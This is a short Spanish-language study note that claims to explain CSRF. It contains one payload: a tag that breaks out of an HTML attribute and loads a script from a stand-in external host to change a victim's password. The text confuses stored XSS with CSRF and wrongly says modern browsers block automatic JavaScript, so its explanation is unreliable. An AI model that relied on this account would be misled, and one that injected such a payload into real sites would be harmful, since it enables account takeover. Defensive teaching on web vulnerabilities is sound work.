# Falsificación de Solicitud entre Sitios (CSRF)

## Descripción
La **falsificación de solicitud entre sitios (CSRF)** es una vulnerabilidad que permite que un atacante realice acciones en nombre de un usuario autenticado en una aplicación web. 

Un atacante puede inyectar código JavaScript malicioso en un sitio vulnerable (por ejemplo, en un comentario), que se ejecutará cuando la víctima, estando autenticada, visite la página.

---

## Ejemplo de ataque
Un ataque común de CSRF es **cambiar la contraseña de la víctima** usando su sesión activa.

Ejemplo de carga útil:
```html
"><script src=//www.example.com/exploit.js></script>
```

El archivo `exploit.js` contendría el código necesario para realizar el cambio de contraseña o ejecutar las acciones deseadas a través de las APIs de la aplicación.

### Riesgos
- Toma de control de cuentas de usuario.
- Acceso a funciones sensibles en cuentas de **administradores**.
- Potencial acceso al servidor backend si el administrador tiene privilegios elevados.

---

## Prevención
Es fundamental implementar medidas de seguridad tanto en el **frontend** como en el **backend**:

### 1. Sanitización
Eliminar caracteres especiales o no estándar de la entrada del usuario antes de mostrarla o almacenarla.

### 2. Validación
Asegurarse de que la entrada cumpla con el formato esperado (por ejemplo, validar que un email tenga el formato correcto).

### 3. Depuración de salida
Eliminar caracteres peligrosos antes de mostrar la información al cliente.

### 4. Medidas adicionales
- Uso de **WAF (Web Application Firewall)** para bloquear inyecciones comunes.
- Navegadores modernos bloquean ejecución automática de JavaScript.
- **Tokens anti-CSRF** únicos por sesión o solicitud.
- Uso del atributo de cookie `SameSite=Strict` o `Lax`.
- Pedir reautenticación (por ejemplo, volver a ingresar la contraseña antes de acciones críticas).

